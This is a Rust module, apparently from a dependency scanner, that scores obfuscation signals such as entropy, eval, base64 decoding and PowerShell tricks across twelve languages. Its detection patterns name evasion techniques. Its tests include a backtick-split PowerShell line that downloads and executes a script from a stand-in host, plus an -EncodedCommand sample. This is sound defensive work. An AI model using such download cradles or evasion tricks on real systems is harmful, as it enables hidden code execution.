//! Obfuscation heuristics.
//!
//! Single signals fire constantly in legit code (minified bundles, embedded data,
//! crypto libs). We score multiple signals per file and emit one Finding per file
//! with severity scaled by how many independent signals hit.
//!
//! Signals:
//!   * High Shannon entropy (>= 5.5 bits/byte) — base64/hex/encrypted blobs
//!   * `eval(` or `new Function(` / Python `exec(` / `compile(`
//!   * Long hex escape runs (`\xNN\xNN\xNN...`) or `\uNNNN` runs
//!   * Long base64 string literals (>200 chars)
//!   * `String.fromCharCode` / `.charCodeAt` chains (Node)
//!   * `__import__("...")` with reversed/encoded module name (Python)
//!
//! Crude minified-vs-obfuscated guard: if the longest line is enormous AND the file
//! looks like a known minifier output (`/*! ... */` banner, sourceMappingURL footer),
//! we downgrade severity by one level.

use regex::Regex;
use std::path::Path;
use std::sync::OnceLock;

use crate::analyze::util;
use crate::model::{Category, Finding, Severity};

#[derive(Copy, Clone)]
pub enum Lang {
    JavaScript,
    Python,
    Rust,
    Ruby,
    Php,
    Go,
    Java,
    /// C and C++ (shared headers, overlapping surface).
    Cpp,
    Perl,
    /// Shell (sh/bash/zsh) - covers OS-package install hooks.
    Shell,
    /// PowerShell (`ps1`/`psm1`) - Chocolatey packages ARE PowerShell scripts,
    /// and Windows install hooks live here.
    PowerShell,
    Lua,
}

impl Lang {
    /// Every language this analyzer covers, for a full-tree scan.
    pub const ALL: &'static [Lang] = &[
        Lang::JavaScript,
        Lang::Python,
        Lang::Rust,
        Lang::Ruby,
        Lang::Php,
        Lang::Go,
        Lang::Java,
        Lang::Cpp,
        Lang::Perl,
        Lang::Shell,
        Lang::PowerShell,
        Lang::Lua,
    ];

    fn exts(self) -> &'static [&'static str] {
        match self {
            Lang::JavaScript => &["js", "mjs", "cjs", "ts"],
            Lang::Python => &["py"],
            Lang::Rust => &["rs"],
            Lang::Ruby => &["rb"],
            Lang::Php => &["php"],
            Lang::Go => &["go"],
            Lang::Java => &["java", "kt"],
            Lang::Cpp => &["c", "h", "cpp", "cc", "cxx", "hpp", "hh", "hxx"],
            Lang::Perl => &["pl", "pm", "t"],
            Lang::Shell => &["sh", "bash", "zsh", "ksh"],
            Lang::PowerShell => &["ps1", "psm1", "psd1"],
            Lang::Lua => &["lua"],
        }
    }
}

fn hex_run_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r"(?:\\x[0-9a-fA-F]{2}){8,}").unwrap())
}
fn unicode_run_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r"(?:\\u[0-9a-fA-F]{4}){6,}").unwrap())
}
/// A backtick between two word characters — PowerShell's escape character
/// applied where it changes nothing but a literal string search.
fn backtick_split_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r"\w`\w").unwrap())
}
fn base64_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r#"["'][A-Za-z0-9+/]{200,}={0,2}["']"#).unwrap())
}

pub fn scan_dir(root: &Path, out: &mut Vec<Finding>, lang: Lang) {
    for path in util::walk_files(root, lang.exts()) {
        // Skip source maps and declaration files outright
        let s = path.to_string_lossy();
        if s.ends_with(".min.js.map") || s.ends_with(".d.ts") {
            continue;
        }
        let Ok(text) = std::fs::read_to_string(&path) else {
            continue;
        };
        scan_file(&path, &text, out, lang);
    }
}

fn scan_file(path: &Path, text: &str, out: &mut Vec<Finding>, lang: Lang) {
    if text.len() < 64 {
        return; // tiny stub files: no point
    }
    let mut signals: Vec<&'static str> = Vec::new();

    let entropy = util::shannon_entropy(text.as_bytes());
    if entropy >= 5.5 {
        signals.push("high-entropy");
    }

    let lower = text; // keep case for now; markers are case-sensitive
    match lang {
        Lang::JavaScript => {
            if lower.contains("eval(") {
                signals.push("eval()");
            }
            if lower.contains("new Function(") || lower.contains("Function(\"return") {
                signals.push("Function() constructor");
            }
            if lower.contains("String.fromCharCode") {
                signals.push("String.fromCharCode");
            }
            if lower.matches(".charCodeAt").count() >= 3 {
                signals.push("charCodeAt chain");
            }
            if lower.contains("atob(") {
                signals.push("atob() base64 decode");
            }
        }
        Lang::PowerShell => {
            // `-EncodedCommand` takes base64 UTF-16LE. Legitimate in tooling,
            // but in a package's install script it is a payload carrier.
            if lower.contains("-EncodedCommand") || lower.contains(" -enc ") {
                signals.push("-EncodedCommand");
            }
            if lower.contains("FromBase64String") {
                signals.push("base64/codecs decode");
            }
            if lower.contains("Invoke-Expression") || lower.contains("iex ") {
                signals.push("Invoke-Expression");
            }
            // A backtick between two word characters: PowerShell's escape is a
            // no-op there, so `I`E`X` still runs as IEX while defeating a
            // literal search. Nothing legitimate writes cmdlet names that way.
            if backtick_split_re().is_match(lower) {
                signals.push("backtick-split identifier");
            }
            // Rebuilding a string from character codes to keep it out of the file.
            if lower.contains("[char[]]") || (lower.contains("[char]") && lower.contains("-join")) {
                signals.push("char array join");
            }
        }
        Lang::Python => {
            if lower.contains("exec(") {
                signals.push("exec()");
            }
            if lower.contains("compile(") {
                signals.push("compile()");
            }
            if lower.contains("marshal.loads") {
                signals.push("marshal.loads");
            }
            if lower.contains("base64.b64decode") || lower.contains("codecs.decode") {
                signals.push("base64/codecs decode");
            }
            if lower.contains("__import__(") {
                signals.push("__import__()");
            }
        }
        Lang::Ruby => {
            if lower.contains("eval(")
                || lower.contains("instance_eval")
                || lower.contains("class_eval")
            {
                signals.push("eval()");
            }
            if lower.contains("Marshal.load") {
                signals.push("marshal.loads");
            }
            if lower.contains("Base64.decode64") || lower.contains(".unpack(") {
                signals.push("base64/codecs decode");
            }
            if lower.contains("Zlib::Inflate") {
                signals.push("zlib inflate");
            }
        }
        Lang::Php => {
            if lower.contains("eval(") {
                signals.push("eval()");
            }
            if lower.contains("base64_decode(") {
                signals.push("base64/codecs decode");
            }
            if lower.contains("gzinflate(") || lower.contains("gzuncompress(") {
                signals.push("gzinflate");
            }
            if lower.contains("str_rot13(") {
                signals.push("str_rot13");
            }
            if lower.contains("create_function(") {
                signals.push("create_function");
            }
        }
        Lang::Go => {
            // Go has no eval; obfuscated payloads lean on encoded blobs decoded
            // at runtime. The generic entropy / \xNN / base64-blob signals cover
            // the rest.
            if lower.contains("base64.StdEncoding.DecodeString")
                || lower.contains("base64.RawStdEncoding.DecodeString")
                || lower.contains("base64.URLEncoding.DecodeString")
            {
                signals.push("base64/codecs decode");
            }
            if lower.contains("hex.DecodeString") {
                signals.push("hex decode");
            }
        }
        Lang::Java => {
            if lower.contains("Base64.getDecoder")
                || lower.contains("DatatypeConverter.parseBase64Binary")
            {
                signals.push("base64/codecs decode");
            }
            if lower.contains("ScriptEngine") || lower.contains(".eval(") {
                signals.push("eval()");
            }
            if lower.contains("defineClass(") {
                signals.push("defineClass");
            }
        }
        Lang::Rust => {
            // No eval; obfuscation leans on embedded blobs, type-punning, and asm.
            // All weak on their own — corroborated by the generic entropy/blob
            // signals below.
            if lower.contains("include_bytes!") {
                signals.push("include_bytes! blob");
            }
            if lower.contains("transmute") {
                signals.push("transmute");
            }
            if lower.contains("asm!(") || lower.contains("global_asm!(") {
                signals.push("inline asm");
            }
            if lower.contains("base64::decode") || lower.contains("from_base64") {
                signals.push("base64/codecs decode");
            }
        }
        Lang::Cpp => {
            // Shellcode loaders lean on inline asm + RWX memory; embedded blobs
            // are caught by the generic \xNN-run / base64 signals below.
            if lower.contains("__asm") {
                signals.push("inline asm");
            }
            if lower.contains("VirtualProtect")
                || lower.contains("VirtualAllocEx")
                || lower.contains("mprotect")
            {
                signals.push("rwx memory");
            }
        }
        Lang::Perl => {
            if lower.contains("eval \"") || lower.contains("eval '") || lower.contains("eval $") {
                signals.push("eval()");
            }
            if lower.contains("pack(") || lower.contains("unpack(") {
                signals.push("pack/unpack");
            }
            if lower.contains("decode_base64") || lower.contains("MIME::Base64") {
                signals.push("base64/codecs decode");
            }
        }
        Lang::Shell => {
            if lower.contains("eval ") || lower.contains("eval \"") {
                signals.push("eval()");
            }
            if lower.contains("base64 -d") || lower.contains("base64 --decode") {
                signals.push("base64/codecs decode");
            }
            // Classic space/word hiding via the field separator.
            if lower.contains("${IFS}") {
                signals.push("IFS obfuscation");
            }
            if lower.contains("xxd -r") || lower.contains("od -c") {
                signals.push("hex decode");
            }
        }
        Lang::Lua => {
            if lower.contains("loadstring") || lower.contains("load(") {
                signals.push("eval()");
            }
            if lower.contains("string.dump") {
                signals.push("bytecode dump");
            }
            if lower.contains("string.char") {
                signals.push("string.char");
            }
        }
    }

    if hex_run_re().is_match(text) {
        signals.push(r"long \xNN run");
    }
    if unicode_run_re().is_match(text) {
        signals.push(r"long \uNNNN run");
    }
    if base64_re().is_match(text) {
        signals.push("base64 blob");
    }

    if signals.is_empty() {
        return;
    }
    // A single "weak" signal (`compile(`, `__import__(`, `eval(`, ...) fires
    // constantly in legit metaprogramming, so it only counts when corroborated:
    // require at least one strong signal, or two signals of any kind.
    let has_strong = signals.iter().any(|s| !is_weak_signal(s));
    if !has_strong && signals.len() < 2 {
        return;
    }

    let mut severity = match signals.len() {
        1 => Severity::Low,
        2 => Severity::Medium,
        3 => Severity::High,
        _ => Severity::Critical,
    };

    // Minified-bundle dampener
    if looks_minified(text) {
        severity = match severity {
            Severity::Critical => Severity::High,
            Severity::High => Severity::Medium,
            Severity::Medium => Severity::Low,
            Severity::Low => Severity::Info,
            s => s,
        };
    }

    let dep = util::owner(path, "<project>");
    out.push(Finding {
        dependency: dep,
        severity,
        category: Category::Obfuscation,
        detail: format!(
            "{} obfuscation signal(s): {} (entropy {:.2})",
            signals.len(),
            signals.join(", "),
            entropy
        ),
        location: Some(path.display().to_string()),
        evidence: None,
        enrich_url: None,
    });
}

/// Signals common enough in benign code that alone they mean nothing; they add
/// weight only alongside another signal.
fn is_weak_signal(s: &str) -> bool {
    matches!(
        s,
        "eval()"
            | "Function() constructor"
            | "atob() base64 decode"
            | "exec()"
            | "compile()"
            | "__import__()"
            | "base64/codecs decode"
            | "include_bytes! blob"
            | "transmute"
            | "inline asm"
            | "rwx memory"
            | "pack/unpack"
            | "string.char"
    )
}

fn looks_minified(text: &str) -> bool {
    let max_line = text.lines().map(|l| l.len()).max().unwrap_or(0);
    let banner = text.starts_with("/*!") || text.contains("//# sourceMappingURL=");
    max_line > 2000 && banner
}

#[cfg(test)]
mod ps_tests {
    use super::*;

    fn scan_one(file: &str, content: &str) -> Vec<Finding> {
        let dir = std::env::temp_dir().join(format!("pm-obf-ps-{}-{file}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join(file), content).unwrap();
        let mut out = Vec::new();
        scan_dir(&dir, &mut out, Lang::PowerShell);
        std::fs::remove_dir_all(&dir).ok();
        out
    }

    /// PowerShell's escape character is a no-op between word characters, so
    /// `I`E`X` runs as IEX while defeating a literal search for it. This is the
    /// tell a shell-flavoured pattern set would never have caught.
    #[test]
    fn a_backtick_split_identifier_is_obfuscation() {
        let f = scan_one(
            "evil.ps1",
            &format!("{}\nI`E`X (New-Object Net.WebClient).DownloadString('http://x.test/a')\n", "# ".repeat(40)),
        );
        assert!(!f.is_empty(), "should flag");
        assert!(f[0].detail.contains("backtick-split identifier"), "{}", f[0].detail);
    }

    #[test]
    fn an_encoded_command_is_a_payload_carrier() {
        let f = scan_one(
            "enc.ps1",
            &format!("{}\npowershell -EncodedCommand SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQA\n", "# ".repeat(40)),
        );
        assert!(f.iter().any(|x| x.detail.contains("-EncodedCommand")), "got {f:?}");
    }

    /// An ordinary install script must stay quiet, or the signal is worthless.
    #[test]
    fn an_ordinary_install_script_is_not_flagged() {
        let f = scan_one(
            "chocolateyInstall.ps1",
            "$ErrorActionPreference = 'Stop'\n\
             $toolsDir = Split-Path -parent $MyInvocation.MyCommand.Definition\n\
             $packageArgs = @{ packageName = 'jq'; fileFullPath = $toolsDir }\n\
             Install-ChocolateyPackage @packageArgs\n",
        );
        assert!(f.is_empty(), "got {f:?}");
    }
}
